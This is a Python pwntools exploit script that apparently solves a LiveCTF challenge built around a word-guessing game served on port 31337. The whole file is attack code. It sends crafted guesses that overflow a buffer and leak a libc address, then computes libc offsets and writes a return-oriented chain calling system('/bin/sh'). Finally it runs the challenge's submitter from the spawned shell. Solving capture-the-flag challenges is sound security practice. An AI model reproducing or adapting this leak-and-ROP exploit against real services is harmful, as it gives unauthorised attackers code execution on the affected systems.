from pwn import *

#p = process('./challenge', env={'LD_PRELOAD':'./libc.so.6'})

HOST = os.environ.get('HOST', 'localhost')
PORT = 31337

p = remote(HOST, int(PORT))

# reversers
solution_len = 10
guesses_num = 3

def strip_color(buf:bytes):
    tmp = buf
    tmp = tmp.replace(b"\x1B[0m", b"")
    tmp = tmp.replace(b"\x1B[1;30;42m", b"")
    tmp = tmp.replace(b"\x1B[1;30;43m", b"")
    return tmp

p.recvuntil(b"How long will the solution word be?")
p.sendline(str(solution_len).encode())
p.recvuntil(b"How many guesses does the player get?")
p.sendline(str(guesses_num).encode())

p.recvuntil(b"What is your guess ")
for i in range(9):
    p.send(b"a")
    p.send(b" ")
#p.send(b"\x70")
p.send(b"\xf0")
p.send(b"\n")

p.recvuntil(b"What is your guess ")
for i in range(9):
    p.send(b"b")
    p.send(b" ")
p.send(b"\xff")
p.send(b" ")
for i in range(0x6c-10):
    p.send(b"b")
    p.send(b" ")
# modify m to stop the loop
p.send(b"\xf1")

p.recvuntil(b"?\n")
_data = p.recvuntil(b"What ", drop=True)
_data = strip_color(_data)
_data = _data.replace(b" ", b"")
#print(_data)
libc_leak = u64(_data[0x97:0x97+8])
print("libc_leak:", hex(libc_leak))
libc_base = libc_leak - 0x29d90
binsh = libc_base + 0x1d8698
pop_ret = libc_base + 0x2a3e5
ret = libc_base + 0x29cd6
libc_system = libc_base + 0x50d60
print("libc_system:", hex(libc_system))

p.recvuntil(b"your guess ")
for i in range(0x62):
    p.send(b"c")
    p.send(b" ")
p.send(b"\x81")
p.send(b" ")

def write_u8(value):
    for i in p64(value):
        p.send(bytes([i]))
        p.send(b" ")

write_u8(pop_ret)
write_u8(binsh)
write_u8(ret)
write_u8(libc_system)

for i in range(0x5d):
    p.send(b"d")
    p.send(b" ")

p.recvuntil(b" You lose!")
p.sendline(b"./submitter")
_data = p.recvall(timeout=3)
print(_data)
#flag = p.recvline_contains(b'LiveCTF{').decode().strip()
#print(flag)